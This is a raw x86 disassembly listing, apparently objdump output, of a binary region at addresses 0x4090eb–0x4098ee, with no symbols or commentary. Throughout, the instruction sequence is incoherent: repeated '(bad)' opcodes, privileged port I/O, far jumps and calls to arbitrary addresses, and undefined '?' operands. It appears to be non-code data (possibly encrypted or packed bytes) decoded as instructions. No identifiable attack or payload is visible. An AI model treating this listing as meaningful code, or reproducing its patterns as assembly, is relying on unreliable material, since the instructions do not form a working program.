  4090eb:	mov    ah,0x1
  4090ed:	mov    edx,0x85ce324f
  4090f2:	ins    BYTE PTR es:[edi],dx
  4090f3:	and    DWORD PTR [ebp-0x2132749d],0x75b69404
  4090fd:	in     al,0xd2
  4090ff:	jmp    0xc2b341d3
  409104:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409106:	(bad)  
  409107:	inc    DWORD PTR [edi+0x66f4edca]
  40910d:	cmp    al,0x64
  40910f:	mov    esp,0x599a082c
  409114:	scas   eax,DWORD PTR es:[edi]
  409115:	xchg   ecx,eax
  409116:	mov    al,0x47
  409118:	push   ebp
  409119:	scas   al,BYTE PTR es:[edi]
  40911a:	adc    al,0x49
  40911c:	or     al,0xb4
  40911e:	ins    BYTE PTR es:[edi],dx
  40911f:	cwde   
  409120:	ret    
  409121:	arpl   WORD PTR [ecx-0x4214e410],sp
  409127:	mov    esi,0xe61fe99d
  40912c:	push   ebx
  40912d:	mov    DWORD PTR [esi],esi
  40912f:	push   edx
  409130:	mov    dh,0x14
  409132:	clc    
  409133:	sahf   
  409134:	mov    eax,0x3a8cce52
  409139:	and    BYTE PTR [ecx+ecx*4],dl
  40913c:	shl    DWORD PTR [eax],1
  40913e:	pop    ecx
  40913f:	add    al,BYTE PTR [eax-0x4c]
  409142:	adc    edx,DWORD PTR [eax+0x48b3b74c]
  409148:	inc    eax
  409149:	push   es
  40914a:	call   0x45a:0x77a32111
  409151:	mov    eax,ds:0xfafd250e
  409156:	addr16 sti 
  409158:	popf   
  409159:	cmp    al,ah
  40915b:	jns    0x4091a1
  40915d:	add    esi,DWORD PTR [esi-0x5e]
  409160:	or     ecx,eax
  409162:	mov    dl,0xa5
  409164:	cmp    ebp,DWORD PTR [edx]
  409166:	push   edi
  409167:	mov    ds:0xe80902bc,al
  40916c:	cmp    DWORD PTR [edi],eax
  40916e:	jmp    0x5de61ad0
  409173:	pop    esp
  409174:	add    BYTE PTR [esp+eax*8],0x9
  409178:	push   esp
  409179:	fwait
  40917a:	push   es
  40917b:	(bad)
  409180:	sbb    ecx,edx
  409182:	imul   ebp,edi,0x54
  409185:	int    0x2a
  409187:	jge    0x40913a
  409189:	stc    
  40918a:	push   cs
  40918b:	push   esi
  40918c:	and    eax,0x8e3b0f09
  409191:	jmp    0x4091e3
  409193:	aaa    
  409194:	out    0x6d,al
  409196:	xchg   DWORD PTR [edx],ebx
  409198:	cs aad 0xcd
  40919b:	hlt    
  40919c:	cmp    esi,DWORD PTR [ebp-0x136cd1cc]
  4091a2:	imul   edi,DWORD PTR [edi],0x7669c65e
  4091a8:	pop    esp
  4091a9:	jo     0x40914d
  4091ab:	and    esp,DWORD PTR [ecx]
  4091ad:	add    al,0xd5
  4091af:	lods   al,BYTE PTR ds:[esi]
  4091b0:	xchg   edx,eax
  4091b1:	jg     0x409185
  4091b3:	in     eax,dx
  4091b4:	adc    BYTE PTR [ecx+0x2d],cl
  4091b7:	mov    edx,0xf8f119e3
  4091bc:	(bad)  
  4091bd:	push   eax
  4091be:	int3   
  4091bf:	xor    eax,0x479cb1ff
  4091c4:	enter  0x4849,0xc6
  4091c8:	jo     0x4091b2
  4091ca:	adc    DWORD PTR [esi+edx*4],esp
  4091cd:	mov    ebx,0x50e86189
  4091d2:	nop
  4091d3:	mov    ebx,0xb801cfa0
  4091d8:	je     0x4091f9
  4091da:	pop    es
  4091db:	add    BYTE PTR [ebp-0x41b180ea],dl
  4091e1:	pop    edx
  4091e2:	ror    BYTE PTR [ebx-0x36],1
  4091e5:	push   0x77e66eac
  4091ea:	rcr    DWORD PTR [bx+di-0x7d],0x43
  4091ef:	or     DWORD PTR [ebx-0x3e],edx
  4091f2:	out    0x49,eax
  4091f4:	and    eax,0x3a48a58c
  4091f9:	sbb    ebx,DWORD PTR [ebx+ebp*4+0x7c]
  4091fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091fe:	adc    al,0x8d
  409200:	add    ebx,edi
  409202:	aam    0xc9
  409204:	or     ebp,0xe44c9954
  40920a:	or     eax,esi
  40920c:	mov    eax,0xb319e1ff
  409211:	push   esi
  409212:	cmp    edi,DWORD PTR [ebx]
  409214:	(bad)  
  409215:	out    0x4d,al
  409217:	inc    esp
  409218:	sub    BYTE PTR [esi-0x5ed55f47],ah
  40921e:	iret   
  40921f:	pop    ecx
  409220:	dec    edx
  409221:	ja     0x4091f5
  409223:	mov    esp,0x2ec8aced
  409228:	(bad)  
  409229:	(bad)  
  40922a:	push   eax
  40922b:	push   edi
  40922c:	inc    ebp
  40922d:	xchg   DWORD PTR [eax],ebp
  40922f:	jle    0x40926b
  409231:	out    0x6,eax
  409233:	add    eax,0xa050d07d
  409238:	fisubr DWORD PTR [ebp+0x27]
  40923b:	loopne 0x4091e6
  40923d:	aaa    
  40923e:	popf   
  40923f:	pop    esp
  409240:	clc    
  409241:	out    dx,eax
  409242:	sbb    eax,0x3953b1d1
  409247:	ret    
  409248:	dec    edi
  409249:	leave  
  40924a:	pop    DWORD PTR [ebp+0xa]
  40924d:	pop    ecx
  40924e:	aas    
  40924f:	sub    cl,0x4
  409252:	or     al,0x27
  409254:	sub    eax,0xd3a4190c
  409259:	xor    ecx,0xffffffd3
  40925c:	sbb    dl,BYTE PTR [ebp+0x36]
  40925f:	cmp    ebp,DWORD PTR [ebx-0x23]
  409262:	jp     0x409280
  409264:	mov    eax,ds:0x7b473809
  409269:	push   0xffffffdf
  40926b:	outs   dx,BYTE PTR ds:[esi]
  40926c:	cs (bad) 
  40926e:	dec    ebp
  40926f:	popf   
  409270:	inc    edi
  409271:	retf   
  409272:	dec    edx
  409273:	sbb    eax,DWORD PTR [ecx+0x7d]
  409276:	dec    edi
  409277:	fcomp  QWORD PTR ds:0xb3a7406a
  40927d:	dec    esi
  40927e:	scas   eax,DWORD PTR es:[edi]
  40927f:	pop    ds
  409280:	test   DWORD PTR [ebp+eiz*2+0x16],eax
  409284:	cld    
  409285:	test   BYTE PTR [ecx],bh
  409287:	or     edx,DWORD PTR [ebx]
  409289:	sbb    ebx,ebx
  40928b:	int    0x76
  40928d:	hlt    
  40928e:	jmp    0x409259
  409290:	leave  
  409291:	xchg   esp,eax
  409292:	pop    ebx
  409293:	loopne 0x40930e
  409295:	jnp    0x4092a9
  409297:	outs   dx,BYTE PTR ds:[esi]
  409298:	test   DWORD PTR [esp+ecx*4],esi
  40929b:	test   al,0x3f
  40929d:	inc    ecx
  40929e:	sub    BYTE PTR [ecx+ecx*8+0x6bc9a55c],ah
  4092a5:	hlt    
  4092a6:	adc    esi,DWORD PTR [edi+ebp*2+0x33fc94fa]
  4092ad:	dec    edi
  4092ae:	out    0x25,al
  4092b0:	sbb    DWORD PTR [ebp+ecx*8+0x308372ac],edi
  4092b7:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4092b9:	fbstp  TBYTE PTR [edx]
  4092bb:	test   BYTE PTR [ecx-0x7df41264],0x4c
  4092c2:	and    edx,DWORD PTR [ebx-0x3d]
  4092c5:	es adc al,0xb6
  4092c8:	pop    ss
  4092c9:	clc    
  4092ca:	adc    dl,BYTE PTR [eax-0x21]
  4092cd:	std    
  4092ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092cf:	or     DWORD PTR [ebp-0x2b41e331],eax
  4092d5:	dec    ebx
  4092d6:	into   
  4092d7:	push   ss
  4092d8:	inc    esp
  4092d9:	mov    cl,0x58
  4092db:	cld    
  4092dc:	scas   eax,DWORD PTR es:[edi]
  4092dd:	mov    ebp,0xbdb324b6
  4092e2:	xchg   edx,eax
  4092e3:	xor    edx,DWORD PTR [ecx-0xb]
  4092e6:	cmp    cl,BYTE PTR [ebx+0x3767d66e]
  4092ec:	pop    esi
  4092ed:	push   0x261a8e8a
  4092f2:	cdq    
  4092f3:	xchg   ebx,eax
  4092f4:	sub    BYTE PTR ds:0xa25571f7,cl
  4092fa:	jbe    0x40931f
  4092fc:	aaa    
  4092fd:	sub    al,BYTE PTR [ecx-0x75]
  409300:	mov    ebx,0xa2930125
  409305:	mov    ecx,0xd6f78df
  40930a:	jne    0x40930f
  40930c:	xchg   ecx,eax
  40930d:	lock popf 
  40930f:	push   edx
  409310:	retf   
  409311:	std    
  409312:	das    
  409313:	popa   
  409314:	iret   
  409315:	inc    ebx
  409316:	aad    0xa
  409318:	fstp   DWORD PTR [edi-0x72eb14d4]
  40931e:	out    0x4,al
  409320:	shr    ah,0x66
  409323:	pop    edi
  409324:	sub    dl,ah
  409326:	fst    DWORD PTR [edx]
  409328:	xor    al,ch
  40932a:	jb     0x409300
  40932c:	push   ebx
  40932d:	push   ds
  40932e:	ins    BYTE PTR es:[edi],dx
  40932f:	cmp    edx,DWORD PTR [esi+0x7308fdce]
  409335:	outs   dx,BYTE PTR ds:[esi]
  409336:	(bad)  
  409337:	cmp    al,0x92
  409339:	mov    ds:0x31d6e816,eax
  40933e:	fs jmp 0x7444ab3
  409344:	sub    bh,BYTE PTR [esi-0x19]
  409347:	rcl    bl,1
  409349:	add    BYTE PTR [edi],bh
  40934b:	sub    DWORD PTR [edx],esp
  40934d:	gs ins BYTE PTR es:[edi],dx
  40934f:	bound  esi,QWORD PTR cs:[esp+ecx*2+0x1d54953e]
  409357:	sub    BYTE PTR [ecx-0x31],dh
  40935a:	mov    eax,0x1d7af16f
  40935f:	outs   dx,BYTE PTR ds:[esi]
  409360:	push   esp
  409361:	jb     0x4093bb
  409363:	inc    esp
  409364:	mov    esp,0x8f011d21
  409369:	inc    esp
  40936a:	fist   DWORD PTR [eax+0x4952769e]
  409370:	stos   DWORD PTR es:[edi],eax
  409371:	mov    ds:0x95ad5566,al
  409376:	fld    QWORD PTR [edx+0x68757638]
  40937c:	xor    BYTE PTR [ecx],dh
  40937e:	xchg   edx,eax
  40937f:	mov    esi,0x98e23952
  409384:	rcl    BYTE PTR [edi],0xf7
  409387:	dec    ecx
  409388:	int    0x72
  40938a:	push   cs
  40938b:	push   esi
  40938c:	pop    ss
  40938d:	stos   BYTE PTR es:[edi],al
  40938e:	fwait
  40938f:	xchg   edi,eax
  409390:	paddsw mm0,QWORD PTR [esi]
  409393:	mov    eax,0x21806073
  409398:	or     bh,al
  40939a:	shr    edx,0x1d
  40939d:	mov    ds:0xf4d47c2,eax
  4093a2:	cdq    
  4093a3:	or     DWORD PTR [esi+eiz*4+0x79e565fe],ebp
  4093aa:	xor    BYTE PTR [edi+edx*1+0x6f97a1a6],dl
  4093b1:	xor    al,0x10
  4093b3:	mov    esi,0xdcd5625a
  4093b8:	xlat   BYTE PTR ds:[ebx]
  4093b9:	in     al,dx
  4093ba:	mov    esp,cs
  4093bc:	outs   dx,BYTE PTR ds:[esi]
  4093bd:	mov    cl,0x95
  4093bf:	loop   0x409384
  4093c1:	xor    al,0x43
  4093c3:	xchg   edx,eax
  4093c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093c5:	xchg   edi,eax
  4093c6:	rol    BYTE PTR [ecx],0x0
  4093c9:	mov    al,ds:0xc235fa10
  4093ce:	loopne 0x409351
  4093d0:	into   
  4093d1:	fdiv   QWORD PTR [ebx]
  4093d3:	mov    edi,0x20c4d839
  4093d8:	stos   BYTE PTR es:[edi],al
  4093d9:	ret    0x153d
  4093dc:	sbb    al,0x2d
  4093de:	mov    al,0x43
  4093e0:	jle    0x409407
  4093e2:	cli    
  4093e3:	les    esp,FWORD PTR [ebp+0x3d]
  4093e6:	mov    eax,ds:0x671ac297
  4093eb:	test   eax,0xb9572b1a
  4093f0:	cmp    DWORD PTR [eax],0x1f
  4093f3:	pmaxsw mm4,mm2
  4093f6:	push   esp
  4093f7:	mov    gs,WORD PTR [esi-0x7d]
  4093fa:	f2xm1  
  4093fc:	js     0x4093f6
  4093fe:	psrld  mm7,QWORD PTR [ebx-0x67]
  409402:	retf   0x2161
  409405:	cmp    DWORD PTR [eax],ecx
  409407:	fsubr  QWORD PTR [ebp-0x2b]
  40940a:	cli    
  40940b:	aas    
  40940c:	lds    esi,FWORD PTR [eax+ebp*1+0x3c7f2c29]
  409413:	mov    bl,0x7d
  409415:	das    
  409416:	jae    0x409484
  409418:	push   ss
  409419:	mov    bh,dh
  40941b:	cwde   
  40941c:	or     al,0xd0
  40941e:	mov    BYTE PTR [edx-0x25],0x41
  409422:	cwde   
  409423:	je     0x409404
  409425:	add    dl,al
  409427:	sub    ecx,DWORD PTR [esi-0x49]
  40942a:	mov    bl,0x62
  40942c:	mov    bl,0x3
  40942e:	adc    eax,0x190240fb
  409433:	(bad)  
  409434:	fisub  WORD PTR [ebx+0x54]
  409437:	lods   eax,DWORD PTR ds:[esi]
  409438:	jl     0x40945e
  40943a:	jbe    0x4094b5
  40943c:	inc    edi
  40943d:	daa    
  40943e:	jle    0x409423
  409440:	or     BYTE PTR [edi+edi*8+0x2b],dh
  409444:	xor    ah,cl
  409446:	cmp    al,0x56
  409448:	cmp    ebp,esp
  40944a:	jae    0x4093f8
  40944c:	fbld   TBYTE PTR ds:0x4c225020
  409452:	in     al,0xd0
  409454:	mov    esp,0x36539c7f
  409459:	inc    ebp
  40945a:	mov    ebp,esp
  40945c:	jmp    0xc1313e87
  409461:	adc    ebx,esp
  409463:	mov    esi,0x99d0a215
  409468:	sub    ax,0x65e6
  40946c:	cdq    
  40946d:	mov    ebp,0x687ca828
  409472:	jp     0x4094ee
  409474:	and    ebx,DWORD PTR [ebx+esi*4+0x706b0c3e]
  40947b:	(bad)  
  40947c:	adc    DWORD PTR [edx+0x689437f2],ebx
  409482:	dec    edx
  409483:	mov    dl,0xb4
  409485:	or     eax,0x265e673a
  40948a:	je     0x40947c
  40948c:	sbb    BYTE PTR [ebp+0x54],cl
  40948f:	sbb    ebp,DWORD PTR [eax+eiz*1+0x2b247792]
  409496:	call   0x116fd4c9
  40949b:	dec    esp
  40949c:	sub    esi,DWORD PTR [esi+0x9be4676]
  4094a2:	loop   0x40946b
  4094a4:	cs in  al,0x53
  4094a7:	js     0x4094b6
  4094a9:	mov    bl,0x1d
  4094ab:	inc    edi
  4094ac:	jb     0x409471
  4094ae:	call   0x5af6:0x5cdb0356
  4094b5:	mov    WORD PTR [esi+0x39],ds
  4094b8:	int    0xc8
  4094ba:	sub    al,0x21
  4094bc:	adc    DWORD PTR [ebp+ecx*8-0x3a],eax
  4094c0:	adc    esi,DWORD PTR [ecx]
  4094c2:	or     al,0xf
  4094c4:	xor    BYTE PTR [ecx-0x36eddb71],ch
  4094ca:	mov    ds:0x64e25ed7,eax
  4094cf:	xlat   BYTE PTR ds:[ebx]
  4094d0:	mov    ecx,0x7e93d29d
  4094d5:	xor    dh,0xa5
  4094d8:	cmp    eax,0xeb38ea6f
  4094dd:	imul   edi,DWORD PTR [eax-0x130515f2],0x3c
  4094e4:	addr16 cmp al,bl
  4094e7:	dec    ebx
  4094e8:	mov    ebx,0x3e63ecd2
  4094ed:	jb     0x40952a
  4094ef:	adc    ebx,ebp
  4094f1:	xchg   DWORD PTR [ebx+0x6093738f],ebx
  4094f7:	push   0x2e
  4094f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094fa:	repnz xchg edx,eax
  4094fc:	call   0x76444f37
  409501:	ja     0x409533
  409503:	xor    ebx,DWORD PTR [ebx-0x7fa67f5a]
  409509:	sbb    bl,dh
  40950b:	push   ebp
  40950c:	cld    
  40950d:	cmp    esp,DWORD PTR [ecx-0x19]
  409510:	cs or  ch,0xee
  409514:	lea    eax,[ebx+0x674925f2]
  40951a:	jmp    0x5ca77fae
  40951f:	xor    DWORD PTR [ebp+0x22],ebx
  409522:	inc    esi
  409523:	sub    eax,0x58eb590b
  409528:	inc    edx
  409529:	or     eax,0xc115d6dc
  40952e:	out    0xb0,eax
  409530:	pop    edx
  409531:	jmp    0x543a:0x12d5d069
  409538:	mov    BYTE PTR [eax],ah
  40953a:	or     eax,ecx
  40953c:	pmuludq mm4,QWORD PTR [edi]
  40953f:	dec    ebx
  409540:	inc    esi
  409541:	pop    ebx
  409542:	outs   dx,BYTE PTR ds:[esi]
  409543:	(bad)
  409547:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409548:	add    al,0x43
  40954a:	or     ebp,edi
  40954c:	lock mov esi,0x2c232b2d
  409552:	mov    al,ds:0xa2028394
  409557:	mov    dl,0x3
  409559:	jmp    ecx
  40955b:	das    
  40955c:	shl    DWORD PTR [edi],cl
  40955e:	mov    ah,0x84
  409560:	js     0x409556
  409562:	pop    esi
  409563:	in     eax,0x90
  409565:	adc    DWORD PTR [esp+esi*4+0x4c927808],ebp
  40956c:	adc    DWORD PTR [esi+0x112b8ec],0xbcc7039f
  409576:	mov    eax,0x65d0cf6c
  40957b:	rcr    DWORD PTR [ebp+0x133368f5],0x64
  409582:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409583:	mov    DWORD PTR [ebp-0x1f391893],edx
  409589:	cdq    
  40958a:	ret    0xa23d
  40958d:	or     ebx,DWORD PTR [edi]
  40958f:	hlt    
  409590:	or     esi,DWORD PTR [esi+0x450f8973]
  409596:	xchg   ecx,eax
  409597:	cmp    eax,0xfbaa5777
  40959c:	jmp    0xd722779c
  4095a1:	jb     0x409572
  4095a3:	call   0xe4a8:0x50f25605
  4095aa:	sub    al,0x8b
  4095ac:	int3   
  4095ad:	std    
  4095ae:	and    edi,DWORD PTR [ebp+0x32e648b5]
  4095b4:	jp     0x4095a6
  4095b6:	inc    esi
  4095b7:	xchg   ebx,eax
  4095b8:	xchg   ebp,eax
  4095b9:	inc    esi
  4095ba:	pop    eax
  4095bb:	pop    es
  4095bc:	ins    DWORD PTR es:[edi],dx
  4095bd:	adc    al,0x8b
  4095c0:	mov    dh,0x38
  4095c2:	in     eax,dx
  4095c3:	aam    0x3d
  4095c5:	adc    BYTE PTR ds:0x57e22541,bl
  4095cb:	loop   0x4095a7
  4095cd:	xchg   edx,eax
  4095ce:	mov    esp,0x138ebf54
  4095d3:	inc    esi
  4095d4:	lock (bad) 
  4095d6:	cmp    al,0x4c
  4095d8:	cdq    
  4095d9:	pop    ebx
  4095da:	xchg   edi,eax
  4095db:	in     al,dx
  4095dc:	punpckhwd mm5,QWORD PTR [esi-0x45]
  4095e0:	add    al,0xe5
  4095e2:	pop    edi
  4095e3:	aam    0x1
  4095e5:	cmp    ebx,DWORD PTR [ebx+0x4e]
  4095e8:	out    0x1b,eax
  4095ea:	xchg   ecx,eax
  4095eb:	ja     0x4095dc
  4095ed:	stc    
  4095ee:	pop    ebp
  4095ef:	into   
  4095f0:	mov    BYTE PTR [ebx+0x2c],bl
  4095f3:	aad    0x40
  4095f5:	imul   ebp,DWORD PTR [esi-0x43],0xca6f788e
  4095fc:	push   ds
  4095fd:	enter  0x6785,0xf8
  409601:	sub    BYTE PTR [ebp+0x4943afe5],ah
  409607:	sub    eax,0xbffd4444
  40960c:	push   ds
  40960d:	sbb    al,0xf9
  40960f:	and    DWORD PTR [ebp+0x29],edx
  409612:	pop    ecx
  409613:	nop
  409614:	xchg   esp,eax
  409615:	push   ds
  409616:	jecxz  0x4095ea
  409618:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409619:	iret   
  40961a:	shl    BYTE PTR [edi+0x7b],cl
  40961d:	jmp    0x786ae248
  409622:	dec    edi
  409623:	adc    al,0xaa
  409625:	mov    edi,0xb74b8f0
  40962a:	dec    ebx
  40962b:	mov    edi,0x83abddeb
  409630:	fisub  DWORD PTR [esi+ebp*8+0x615e816b]
  409637:	out    0x9f,al
  409639:	cld    
  40963a:	mov    DWORD PTR [edi],esp
  40963c:	enter  0xc359,0x80
  409640:	ficomp WORD PTR [ecx+0x8]
  409643:	(bad)  
  409644:	xchg   ebx,eax
  409645:	shr    DWORD PTR [eax],1
  409647:	shl    DWORD PTR [edi+0x4b3ab0a4],0x8b
  40964e:	sar    esp,1
  409650:	add    cl,0xd3
  409653:	dec    edi
  409654:	sub    BYTE PTR [eax],cl
  409656:	mov    ebx,DWORD PTR cs:[ecx+0x57885239]
  40965d:	xchg   edx,eax
  40965e:	xor    DWORD PTR [edx],esi
  409660:	sbb    bh,BYTE PTR [eax-0x5f]
  409663:	out    0xa1,eax
  409665:	adc    eax,0x8fd44ade
  40966a:	xchg   BYTE PTR [ecx-0x1e24ea33],ch
  409670:	cli    
  409671:	pop    esp
  409672:	pop    ss
  409673:	cmp    al,0x77
  409675:	add    DWORD PTR ds:0x82d3d7f0,edx
  40967b:	mov    ?,WORD PTR [edx+0x6a]
  40967e:	cmp    eax,0xffc1e94b
  409683:	imul   DWORD PTR [edi+0x51]
  409686:	ja     0x409624
  409688:	jmp    0x4780:0x9c916567
  40968f:	rcr    DWORD PTR [edi+0xe64f98f],cl
  409695:	fld    DWORD PTR [edx-0x35]
  409698:	shl    DWORD PTR [ebp-0x7352cc15],cl
  40969e:	pop    ds
  40969f:	jo     0x40968b
  4096a1:	mov    dl,0x58
  4096a3:	scas   eax,DWORD PTR es:[edi]
  4096a4:	push   eax
  4096a5:	fxch   st(2)
  4096a7:	mov    ds,WORD PTR [ecx-0x69f249d4]
  4096ad:	or     BYTE PTR [eax-0x50ca76eb],0x12
  4096b4:	ret    
  4096b5:	les    ecx,FWORD PTR [eax+0x22dde8d6]
  4096bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096bc:	out    0x7e,eax
  4096be:	ins    DWORD PTR es:[edi],dx
  4096bf:	jae    0x40966a
  4096c1:	mov    bl,0x76
  4096c3:	or     ebp,DWORD PTR [edx+edi*2-0x69]
  4096c7:	pop    ecx
  4096c8:	repnz push ds
  4096ca:	retf   
  4096cb:	std    
  4096cc:	push   ds
  4096cd:	jnp    0x4096c1
  4096cf:	enter  0x24a8,0xc4
  4096d3:	leave  
  4096d4:	popa   
  4096d5:	jl     0x4096cd
  4096d7:	out    dx,eax
  4096d8:	loope  0x4096b8
  4096da:	(bad)  
  4096dc:	in     al,0xca
  4096de:	jle    0x409665
  4096e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096e1:	or     esi,DWORD PTR [ecx]
  4096e3:	es mov bl,0x27
  4096e6:	pushf  
  4096e7:	fincstp 
  4096e9:	xor    BYTE PTR [edi+0x45],ah
  4096ec:	xchg   esp,eax
  4096ed:	sub    BYTE PTR [ecx],0x5c
  4096f0:	inc    esp
  4096f1:	test   BYTE PTR [ebx],ah
  4096f3:	mov    bl,0xdc
  4096f5:	test   DWORD PTR [eax+0x65cc9474],esi
  4096fb:	jle    0x40972e
  4096fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096fe:	sub    DWORD PTR [edx-0x73b169db],ebx
  409704:	mov    dl,0xa0
  409706:	xor    ebp,eax
  409708:	call   0x7f231f90
  40970d:	jmp    0x895545fa
  409712:	jge    0x409729
  409714:	sub    eax,0x236ea911
  409719:	pushf  
  40971a:	push   edx
  40971b:	sbb    BYTE PTR [edi-0x21bc14a7],cl
  409721:	stos   DWORD PTR es:[edi],eax
  409722:	addr16 inc esp
  409724:	mov    ds:0xa1b455fc,al
  409729:	cs push eax
  40972b:	ja     0x4096ff
  40972d:	pop    eax
  40972e:	xchg   ebx,eax
  40972f:	fnstsw WORD PTR [ebx-0x55]
  409732:	jb     0x409720
  409734:	out    dx,al
  409735:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409736:	scas   eax,DWORD PTR es:[edi]
  409737:	loopne 0x4096c3
  409739:	mov    edx,0x3b702876
  40973e:	leave  
  40973f:	daa    
  409740:	sub    DWORD PTR [ebx+0x3f],edi
  409743:	cld    
  409744:	shl    BYTE PTR [edi+0x139cdab2],cl
  40974a:	fwait
  40974b:	cmp    bl,BYTE PTR [ebx]
  40974d:	mov    al,0x12
  40974f:	call   0x71f7:0x105ae5ea
  409756:	call   0xe91c:0x97aa90c5
  40975d:	pop    ecx
  40975e:	push   esi
  40975f:	data16 das 
  409761:	inc    edi
  409762:	pushf  
  409763:	add    al,0xc3
  409765:	js     0x4097a1
  409767:	mov    cl,0xf0
  409769:	sbb    eax,0x88993ed2
  40976e:	pop    esi
  40976f:	xchg   ebx,eax
  409770:	shr    BYTE PTR ds:0xc30b3284,cl
  409776:	clc    
  409777:	jns    0x409754
  409779:	in     eax,dx
  40977a:	je     0x409775
  40977c:	jge    0x409779
  40977e:	loope  0x409742
  409780:	sub    eax,0xa1a1e980
  409785:	mov    cl,0xb4
  409787:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409788:	aad    0x36
  40978a:	stos   DWORD PTR es:[edi],eax
  40978b:	add    al,0xc
  40978d:	dec    ebp
  40978e:	call   0xb8be94cd
  409793:	ss adc eax,0xecd6153f
  409799:	call   0x4cc0:0x62753889
  4097a0:	test   BYTE PTR [ebp+0x4e],0xd3
  4097a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097a5:	ja     0x4097dd
  4097a7:	lock nop
  4097a9:	fcmovnbe st,st(2)
  4097ab:	int3   
  4097ac:	mov    ebp,0x39a4e8e8
  4097b1:	shl    DWORD PTR [ebp-0x1cb1ee77],cl
  4097b7:	cs jmp 0xa48761fa
  4097bd:	dec    ebp
  4097be:	cli    
  4097bf:	jo     0x40979c
  4097c1:	jg     0x4097d3
  4097c3:	int3   
  4097c4:	retf   0x215
  4097c7:	test   eax,0xe54151b6
  4097cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097cd:	mov    BYTE PTR [esi-0x5c82d191],bl
  4097d3:	mov    al,ds:0x1db99fcb
  4097d8:	xor    al,0xd5
  4097da:	addr16 mov ah,0x3e
  4097dd:	jl     0x4097d1
  4097df:	in     eax,0x93
  4097e1:	pop    ss
  4097e2:	aad    0xf0
  4097e4:	xor    al,0x95
  4097e6:	pop    ss
  4097e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097e8:	hlt    
  4097e9:	or     eax,0xfd593df4
  4097ee:	mov    eax,ds:0xcb272aea
  4097f3:	lock stos DWORD PTR es:[edi],eax
  4097f5:	adc    eax,0x4dfa2df9
  4097fa:	and    BYTE PTR [ebx],0x7d
  4097fd:	lock pop eax
  4097ff:	xchg   edi,eax
  409800:	sahf   
  409801:	mov    bh,0x83
  409803:	in     eax,dx
  409804:	retf   
  409805:	or     BYTE PTR [edx+0x217fdd0a],cl
  40980b:	mov    ecx,0xf84f21fd
  409810:	add    dh,BYTE PTR [edi]
  409812:	repnz and DWORD PTR [edi+0x364320e7],0x88f1229d
  40981d:	outs   dx,DWORD PTR ds:[esi]
  40981e:	call   0xafd:0x7085a2d1
  409825:	js     0x409883
  409827:	ins    DWORD PTR es:[edi],dx
  409828:	sbb    eax,0x22103bed
  40982d:	mov    ds:0x5fbcf1ed,eax
  409832:	fist   DWORD PTR [edx+0x1]
  409835:	lea    esi,[ebp+0x2b]
  409838:	mov    bh,0xf5
  40983a:	arpl   WORD PTR [ecx+0x42],di
  40983d:	in     eax,dx
  40983e:	sbb    DWORD PTR [esi],edx
  409840:	push   esp
  409841:	dec    esi
  409842:	test   DWORD PTR [ebx],ebp
  409844:	wbinvd 
  409846:	cli    
  409847:	std    
  409848:	lods   eax,DWORD PTR ds:[esi]
  409849:	add    eax,0x4bec5196
  40984e:	scas   eax,DWORD PTR es:[edi]
  40984f:	in     al,0x5a
  409851:	(bad)  
  409852:	loop   0x409801
  409854:	sub    DWORD PTR [esi-0x70],eax
  409857:	xchg   esp,eax
  409858:	data16 jge 0x4097db
  40985b:	jl     0x409868
  40985d:	pop    ss
  40985e:	mov    edi,0x3a38ca75
  409863:	retf   0xbe5c
  409866:	cmp    BYTE PTR [ebp-0x3c],al
  409869:	xchg   esp,eax
  40986a:	ds sub al,0x70
  40986d:	test   BYTE PTR [edx+0x2c],cl
  409870:	adc    DWORD PTR [eax+0xe8ac3eb],ebx
  409876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409877:	shl    DWORD PTR [esi+esi*1-0x40e6c9d2],1
  40987e:	lods   eax,DWORD PTR ds:[esi]
  40987f:	xchg   DWORD PTR [esi-0x52],ebp
  409882:	or     eax,0xc63e2d0e
  409887:	inc    esp
  409888:	and    DWORD PTR [edi+ebx*2+0x65],0xa97b5957
  409890:	sar    ch,0x83
  409893:	add    BYTE PTR [ebx],dh
  409895:	test   DWORD PTR [esi],ebp
  409897:	push   ss
  409898:	in     al,0x25
  40989a:	xor    bh,al
  40989c:	dec    ecx
  40989d:	push   esp
  40989e:	xor    DWORD PTR [esi+esi*4],esi
  4098a1:	retf   
  4098a2:	jno    0x40985e
  4098a4:	das    
  4098a5:	jno    0x4098c2
  4098a7:	add    al,0xf0
  4098a9:	mov    WORD PTR [ebx+edi*4+0x3f],?
  4098ad:	repnz pop ebp
  4098af:	sub    eax,0x11f1b5d7
  4098b4:	aaa    
  4098b5:	fcmovb st,st(2)
  4098b7:	mov    dh,0xd1
  4098b9:	xor    ch,BYTE PTR [ebx+0x929fbec]
  4098bf:	mov    ds:0xa1fe3360,eax
  4098c4:	dec    edx
  4098c5:	test   al,0x13
  4098c7:	std    
  4098c8:	bnd je 0x40990a
  4098cb:	loop   0x409936
  4098cd:	jbe    0x409893
  4098cf:	mov    ebp,0x23f8fdb4
  4098d4:	test   edi,edx
  4098d6:	fscale 
  4098d8:	jns    0x409946
  4098da:	jns    0x4098e8
  4098dc:	jae    0x4098c3
  4098de:	push   edx
  4098df:	mov    esp,0x548a449c
  4098e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098e5:	mov    DWORD PTR [esi],esp
  4098e7:	or     eax,0xda059c57
  4098ec:	cld    
  4098ed:	in     al,dx
  4098ee:	sbb    dl,BYTE PTR [esp+ecx*8+0x2d946760]
